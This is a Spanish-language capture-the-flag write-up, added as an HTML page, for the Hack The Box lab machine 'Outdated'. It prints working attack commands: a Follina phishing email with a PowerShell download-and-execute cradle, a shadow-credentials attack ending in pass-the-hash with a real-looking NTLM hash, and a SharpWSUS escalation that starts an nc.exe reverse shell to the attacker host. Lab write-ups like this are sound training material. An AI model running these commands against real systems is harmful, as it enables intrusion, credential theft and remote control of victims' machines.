@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Outdated HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/outdated/pasted-image-20260312184325.png" alt="Outdated HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Outdated</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SMB</span>
+            <span>shadow_credentials</span>
+            <span>Certipy</span>
+            <span>WinRM</span>
+            <span>follina</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Share <code>SMB</code> que expone un PDF sobre <code>Follina</code></li>
+            <li><code>Explotación</code>: Envío de enlace malicioso por correo para explotar <code>Follina</code> y obtener una reverse shell</li>
+            <li><code>Movimiento lateral</code>: BloodHound Shadow Credentials</li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>WSUS Administrators</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260312185147.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Share y Usuarios anónimo</h3>
+            <pre><code>nxc smb dc -u &#x27;Guest&#x27; -p &#x27;&#x27; --rid-brute
+nxc smb dc -u &#x27;Guest&#x27; -p &#x27;&#x27; --shares</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401010058.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Descargar PDF</h3>
+            <pre><code>smbclient //outdated.htb/Shares -U &#x27;Guest&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401103203.png" alt="Outdated HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401104644.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Mandar correo con sawks que incluye un link hacia nuestro Kali</h3>
+            <pre><code>swaks --to itsupport@outdated.htb --from alvaro@alvaro.com --body &quot;http://10.10.16.69/&quot; --header &quot;Muy Importante&quot;
+# Listener para ver si recibimos respuesta a modo de traza
+nc -nlvp 80
+# Hemos recibido la traza y vemos que se ejecuta en powershell</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401104814.png" alt="Outdated HTB" />
+          <p><a href="https://github.com/chvancooten/follina.py.git" target="_blank" rel="noreferrer">PoC GitHub</a></p>
+          <div class="code-card">
+            <h3>Vulnerabilidad Follina que crea un documento.docx malicioso y lo hostea en el puerto 80 como exploit.html</h3>
+            <pre><code>python3 follina.py -m command -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.69:8080/Invoke-PowerShellTcp.ps1&#x27;)&quot; -t rtf</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401105753.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Hostear Nishang y Listener</h3>
+            <pre><code># Hostear Nishang
+python -m http.server 8080
+# Listener
+penelope -p 443</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Mandar correo con el Link a Follina</h3>
+            <pre><code>swaks --to itsupport@outdated.htb --from alvaro@alvaro.com --body &quot;http://10.10.16.69/exploit.html&quot; --header &quot;Muy Importante&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401105715.png" alt="Outdated HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: BloodHound</h2>
+          <div class="code-card">
+            <h3>Windows PowerShell: SharpHound</h3>
+            <pre><code>. .\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All
+# Alternativa
+./SharpHound.exe</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401132719.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Pasar a Kali el comprimido y ejecutar BloodHound</h3>
+            <pre><code># Kali
+impacket-smbserver smb $(pwd) -smb2support -debug
+# Windows
+copy 20260401100322_BloodHound.zip //10.10.16.69/smb/</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401134131.png" alt="Outdated HTB" />
+          <p><a href="https://raw.githubusercontent.com/IAMinZoho/OFFSEC-PowerShell/refs/heads/main/Invoke-Whisker.ps1" target="_blank" rel="noreferrer">Invoke-Whisker</a></p>
+          <div class="code-card">
+            <h3>Efectuar el AddKeyCredential desde Windows ya que no tenemos la password de btables</h3>
+            <pre><code>. .\Invoke-Whisker
+Invoke-Whisker -Command &quot;add /target:sflowers&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401141039.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Crear Certificado</h3>
+            <pre><code># Kali
+echo &#x27;MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgg...&#x27; | base64 -d &gt; cert.pfx
+# Subir cert.pfx a Windows</code></pre>
+          </div>
+          <p><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" target="_blank" rel="noreferrer">Rubeus.exe</a></p>
+          <div class="code-card">
+            <pre><code># OutPut de Invoke-Whisker -Command &quot;add /target:sflowers&quot;
+.\Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:kxPcJFPPsjMZh0QF /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401180045.png" alt="Outdated HTB" />
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401180109.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i dc -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Grupos del usuario sflowers</h3>
+            <pre><code>whoami /all</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401181206.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Escalada SharpWSUS</h3>
+            <pre><code># Listener Kali
+penelope -p 443
+
+# Windows
+# Subir nc.exe, psexec.exe y SharpWSUS.exe
+.\SharpWSUS.exe create /payload:&quot;C:\Users\sflowers\desktop\psexec.exe&quot; /args:&quot;-accepteula -s -d cmd.exe /c &quot;C:\Users\sflowers\desktop\nc.exe 10.10.16.69 443 -e cmd.exe&quot;&quot; /title:&quot;WSUSDemo&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401193650.png" alt="Outdated HTB" />
+          <div class="code-card">
+            <h3>Escalada SharpWSUS</h3>
+            <pre><code>.\SharpWSUS.exe approve /updateid:24b0872b-6639-4196-9738-b35837f1287c /computername:dc.outdated.htb /groupname:&quot;WSUSDemo&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401193739.png" alt="Outdated HTB" />
+          <img class="writeup-image" src="/writeups/assets/outdated/pasted-image-20260401193153.png" alt="Outdated HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SMB</span>
+            <span>shadow_credentials</span>
+            <span>Certipy</span>
+            <span>WinRM</span>
+            <span>follina</span>
+            <span>smtp</span>
+            <span>correo</span>
+            <span>swaks</span>
+            <span>sharphound</span>
+            <span>acl</span>
+            <span>addkeycredentiallink</span>
+            <span>rubeus</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
